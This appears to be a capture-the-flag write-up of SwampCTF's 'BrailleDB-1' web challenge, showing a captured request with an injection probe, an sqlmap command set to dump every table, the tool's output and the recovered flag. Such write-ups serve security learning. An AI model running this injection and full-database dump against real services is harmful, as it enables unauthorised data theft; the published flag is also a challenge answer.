# BrailleDB-1 

## Overview:

Category: Web

## Description

In order to help our university comply with The Americans with Disabilities Act we made an ASCII to braille webservice, now we just hope the faculty doesn't print out their braille on flat pieces of paper....

`http://chals.swampctf.com:64550`

## Approach

Opening the website we have a word to braille converster. Sending an item in the textbox `asd;--`, this is the request:
```
POST /api/braille.php HTTP/1.1
Host: chals.swampctf.com:64550
Content-Length: 39
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://chals.swampctf.com:64550
Referer: http://chals.swampctf.com:64550/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
searchText=asd;--
```

Now I do not have the response as I didn't take a screenshot of it during the competition but the server is now down and I cannot retrieve it, but it was a `200` response.

## Attack

Taking this request as input for sqlmap, as such:
```
└─$ sqlmap -r request.txt --batch --dump-all --risk=3 
```

And as a result:

```
[12:58:34] [INFO] table 'public.feedback' dumped to CSV file '/home/anthony/.local/share/sqlmap/output/chals.swampctf.com/dump/public/feedback.csv'                                                                                                                                 
[12:58:34] [INFO] fetching columns for table 'flag' in database 'public'
[12:58:34] [INFO] retrieved: 'flag'
[12:58:34] [INFO] retrieved: 'text'
[12:58:34] [INFO] retrieved: 'id'
[12:58:34] [INFO] retrieved: 'int4'
[12:58:34] [INFO] fetching entries for table 'flag' in database 'public'
[12:58:34] [INFO] retrieved: 'swampCTF{Un10n_A11_Th3_W4yyy!}'
[12:58:34] [INFO] retrieved: '1'
Database: public
Table: flag
[1 entry]
+----+--------------------------------+
| id | flag                           |
+----+--------------------------------+
| 1  | swampCTF{Un10n_A11_Th3_W4yyy!} |
+----+--------------------------------+

[12:58:34] [INFO] table 'public.flag' dumped to CSV file '/home/anthony/.local/share/sqlmap/output/chals.swampctf.com/dump/public/flag.csv'
[12:58:34] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 59 times
[12:58:34] [INFO] fetched data logged to text files under '/home/anthony/.local/share/sqlmap/output/chals.swampctf.com'

[*] ending @ 12:58:34 /2024-04-06/
```


## Flag

swampCTF{Un10n_A11_Th3_W4yyy!}

# References
1. https://sqlmap.org/